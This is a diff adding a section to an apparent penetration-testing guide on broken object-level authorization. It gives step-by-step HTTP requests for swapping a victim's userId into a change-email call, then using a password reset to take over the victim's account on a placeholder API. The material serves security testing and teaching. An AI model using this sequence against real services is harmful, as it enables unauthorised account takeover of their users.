@@ -129,6 +129,85 @@ If file retrieval is based solely on predictable object keys, BOLA is confirmed
 
 ***
 
+#### Missing Check Led to Complete Account Takeover
+
+{% stepper %}
+{% step %}
+Create two accounts on the target application: one Attacker account and one Victim account
+{% endstep %}
+
+{% step %}
+Log in with the Attacker account and intercept the Change Email request using Burp Suite or a similar proxy
+
+```http
+POST /users/attacker_7453/emails/ HTTP/2
+Host: api.example-platform.com
+Authorization: Bearer <ATTACKER_TOKEN>
+Content-Type: application/json
+
+{
+   "email": "attacker.test@malicious.com",
+   "passwordEncoded": "QXR0YWNrZXJQYXNzMTIzIQ=="
+}
+```
+{% endstep %}
+
+{% step %}
+Replace the `userId` in the request URL with the Victim's `userId` while keeping the Attacker's Bearer token unchanged
+
+```http
+POST /users/victim_2891/emails/ HTTP/2
+Host: api.example-platform.com
+Authorization: Bearer <ATTACKER_TOKEN>
+Content-Type: application/json
+
+{
+   "email": "attacker@malicious.com",
+   "passwordEncoded": "QXR0YWNrZXJQYXNzMTIzIQ=="
+}
+```
+{% endstep %}
+
+{% step %}
+Send the modified request and observe that the server returns a successful response
+
+```http
+{
+   "status": "success",
+   "message": "Email updated successfully"
+}
+```
+{% endstep %}
+
+{% step %}
+Verify that the victim's account now has the attacker-controlled email associated with it
+{% endstep %}
+
+{% step %}
+Trigger the Forgot Password / Password Reset functionality using the attacker-controlled email
+
+```http
+POST /auth/password-reset HTTP/2
+Host: api.example-platform.com
+Content-Type: application/json
+
+{
+   "email": "attacker@malicious.com"
+}
+```
+{% endstep %}
+
+{% step %}
+Receive the password reset email, follow the reset link, and set a new password for the victim's account
+{% endstep %}
+
+{% step %}
+Log in with the newly created password and verify that you have successfully taken over the victim's account
+{% endstep %}
+{% endstepper %}
+
+***
+
 ### White Box
 
 #### BOLA via Disconnected Nested Resource Routing (Hierarchical IDOR)
